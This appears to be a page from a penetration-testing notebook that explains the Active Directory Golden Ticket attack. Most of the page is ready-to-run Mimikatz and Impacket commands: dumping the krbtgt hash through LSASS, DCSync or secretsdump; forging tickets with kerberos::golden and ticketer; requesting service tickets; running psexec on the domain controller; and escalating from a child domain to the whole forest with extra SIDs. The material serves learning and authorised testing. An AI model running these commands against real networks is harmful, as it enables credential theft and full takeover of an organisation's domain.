# Golden Ticket

#### Priv Required: <mark style="color:purple;">krbtgt account hash</mark>

KRBTGT is the account used for Microsoft's implementation of Kerberos. The name is derived from Kerberos (KRB) and Ticket Granting Ticket (TGT). Essentially, this account acts as the service account for the Kerberos Distribution Center (KDC) service, which handles all Kerberos ticket requests. This account is used to encrypt and sign all Kerberos tickets for the domain (includes all domain forest). Since the password hash is shared by all domain controllers of all forest, they can then verify the authenticity of the received TGT when users request access to resources.

However, what if we want to generate our own TGTs to grant us access to everything? This is known as a **Golden Ticket attack**. In a Golden Ticket attack, we bypass the KDC altogether and create our own TGTs, essentially becoming a Ticket Granting Server (TGS). In order to forge TGTs, we need the following information:

* The FQDN of the domain
* The Security Identifier (SID) of the domain
* The username of the account we want to impersonate
* The KRBTGT password hash





#### Methodology:

* Extract **Domain Admin** account's **NTML hash**
* Execute **Pass-the-Hash**
* Retrive **KRBTGT Account hash**
* **Forge** and use a Golden Ticket

## Get Domain Info

### SID

{% code title="From Windows" %}
```powershell
powershell -ep bypass
. .\PowerView.ps1

Get-DomainSID
```
{% endcode %}

{% code title="Powershell" %}
```powershell
whoami /all
```
{% endcode %}

{% code title="From Linux - Impacket" %}
```bash
cd /usr/share/doc/python3-impacket/examples/ # Kali location
lookupsid.py -hashes '$LMhash:$NThash' '$DOMAIN/$USER@$DOMAIN_CONTROLLER' 0
```
{% endcode %}

## Get Domain Admin Account

the first task is obtained a Domain Admin user account with elevated privilege into Domain Controller.

We can use Pass-the-Hash, crack password hash or find plain-text password.

{% content-ref url="../ad-lateral-movement/pass-the-hash.md" %}
[pass-the-hash.md](../ad-lateral-movement/pass-the-hash.md)
{% endcontent-ref %}

{% content-ref url="../ad-enumeration/password-sprayng.md" %}
[password-sprayng.md](../ad-enumeration/password-sprayng.md)
{% endcontent-ref %}

{% content-ref url="../ad-post-compromise-attacks/kerberoasting.md" %}
[kerberoasting.md](../ad-post-compromise-attacks/kerberoasting.md)
{% endcontent-ref %}

Or other ways...

## Get krbtgt's NTLM hash

The second task is obtain the NTLM hash of the krbtgt account. These are the methods to obtain it:

```bash
impacket-secretsdump 'DOMAIN_USER@DC_IP'
> PASS
```

### LSASS

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computer $DC_NAME

Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"' -Computer $DC_NAME
```

<figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>



### DCsync attack

To acquire the NTLM hash of the krbtgt account, various methods can be employed. It can be extracted from the Local Security Authority Subsystem (LSASS) process or the NT Directory Services (NTDS.dll) file located on any Domain controller (DC) within the domain.\
Furthermore, executing a DCsync attack is another strategy to obtain this NTLM hash, which can be performed using tools such as the "lsadump::dcsync" in Mimikatz or the secretsdump.py script by Impacket. It's important to unserscore that to undertake these operations, domain admin pribileges or a similar level of access is typically required.

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:DOMAIN\krbtgt"'
```



## Forge Golden Ticket



{% code title="From Windows - Invoke-Mimikatz" overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:$DOMAIN.local /sid:$DOMAIN_SID /krbtgt:$NTLM_HASH_KRBTGT /id:500 /groups:512 /startoffset:0 /end:600 /renewmax:10080 /ptt"'
```
{% endcode %}

> id:**500 i**s a default id of administrator user in windows
>
> group\_id:**512** is a default id for domain admin group in AD



{% code title="From Linux - Impacket" overflow="wrap" %}
```bash
# Create the golden ticket (with an RC4 key, i.e. NT hash)
impacket-ticketer -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" "$RANDOMUSER" -groups 512 -user-id 1114

# Create the golden ticket (with an AES 128/256bits key)
impacket-ticketer -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser" -groups 512 -user-id $TARGET_USER_ID

# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
impacket-ticketer -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -user-id "$USERID" -groups "$GROUPID1,$GROUPID2,..." "randomuser" -groups 512 -user-id $TARGET_USER_ID
```
{% endcode %}

{% hint style="warning" %}
Then target user must be in the Domain
{% endhint %}



Check the klist

```powershell
klist
```

## Use Golden Ticket

When we generate a ticket, we'll have a TGT (Ticket Granting Ticket). To use this ticket for a specific service, we have to craft an ST (Service Ticket) for the specific service we want.

To find the services available to use inside the domain, we can use this command:

```bash
impacket-GetUserSPNs DOMAIN/USER:'PASS' -dc-ip <DC_IP>
```

This is all the possible services:

<details>

<summary>SPNs list</summary>

| SPN                        | Use Case / Maps to                            | Description                                      |
| -------------------------- | --------------------------------------------- | ------------------------------------------------ |
| `CIFS/hostname`            | SMB / File shares / Smbclient                 | Often used for lateral movement or dumping files |
| `HOST/hostname`            | RDP, WMI, PsExec, WinRM                       | Generic system access — many tools use this      |
| `LDAP/hostname`            | LDAP directory queries                        | Used to query AD objects                         |
| `HTTP/hostname`            | WinRM, web services, Outlook Web Access (OWA) | Required for PowerShell Remoting                 |
| `RPCSS/hostname`           | Remote Procedure Call                         | Rare, used in some remote COM/DCOM scenarios     |
| `MSSQLSvc/hostname:port`   | Microsoft SQL Server                          | Enumerate or access databases                    |
| `WSMAN/hostname`           | PowerShell Remoting                           | Alternative to `HTTP/hostname` for WinRM         |
| `SMTPSVC/hostname`         | SMTP (Exchange)                               | Email systems                                    |
| `IMAP/hostname`            | IMAP (Exchange)                               | Mailbox access                                   |
| `POP/hostname`             | POP3 (Exchange)                               | Mailbox access                                   |
| `TERMSRV/hostname`         | Remote Desktop Services (RDP)                 | For interacting with Terminal Services           |
| `VPN/hostname`             | VPN services                                  | Rare, usually edge devices                       |
| `WINRM/hostname`           | PowerShell Remoting                           | Also often mapped to `HTTP/hostname`             |
| `FQDN$` (computer account) | Implicitly covered under `HOST/hostname`      | Used when impersonating computer accounts        |
| `SVC/hostname` (custom)    | Custom apps registered with SPNs              | Use `setspn -Q */hostname` to enumerate          |

</details>

```bash
impacket-getST -spn 'SERVICE/FQDN' -k -no-pass DOMAIN/USER_OF_THE_TGT -debug
```



### mimikatz

Once we have created the Golden Ticket with mimikatz in the current session, we have to open a new cmd to the current privileges.

```powershell
mimikatz > misc::cmd # this open cmd promt with current privileges
```

### secretsdump.py

{% code overflow="wrap" %}
```bash
export KRB5CCNAME=$(pwd)/NAME.ccache

# create a ST for CIFS service 
impacket-getST -spn 'CIFS/FQDN_DOMAIN' -k -no-pass DOMAIN/USER_OF_THE_TGT -debug

# set the new ST
export KRB5CCNAME=$(pwd)/NAME.ccache

# use ST to use secretdump
imapcket-secretsdump -no-pass -k -dc-ip $DC_IP $DOMAIN.local/$NAME@$MACHINE.$DOMAIN.local
```
{% endcode %}

### psexec

```bash
export KRB5CCNAME=$(pwd)/NAME.ccache

impacket-psexec administrator@<DC_IP> -k -no-pass
```

## Escalate Privilege with GoldTicket

If we have a scenario where we are in a Child Domain and we have the privilege to force a Golden Ticket, we could use this technique to expand our privilege in entire Forest.

### Get the Parent DC info

To understand if we are under a Parent DC we can use the `impacket-GetADDomain` tool.

```bash
impacket-GetADDomain CHILD-DOMAIN/user:pass -dc-ip <child_dc_ip>

# output

```

This returns:

* Child domain name
* Parent domain (if any)
* Forest root
* SID

### Golden Ticket for PrivEsc creation

{% code overflow="wrap" %}
```bash
impacket-ticketer -domain CHILD_DOMAIN -aesKey KRBTGT_AES_HASH -domain-sid CHILD_DOMAIN_SID -groups 519 -user-id USER_ID_TO_IMPERS -extra-sid PARENT_DOMAIN_SID 'usertoimpers'
```
{% endcode %}



### Craft the ST&#x20;

[#use-golden-ticket](golden-ticket.md#use-golden-ticket "mention")



## GoldenCopy

You encounter limitations with your golden tickets (DACLs, detection)? GoldenCopy retrieves all the information (ID, groups, etc) of a specific user in a neo4j database (bloodhound) and prepares the mimikatz/ticketer command to impersonate his permissions.

{% embed url="https://github.com/Dramelac/GoldenCopy" %}



## Resources

{% embed url="https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden" %}







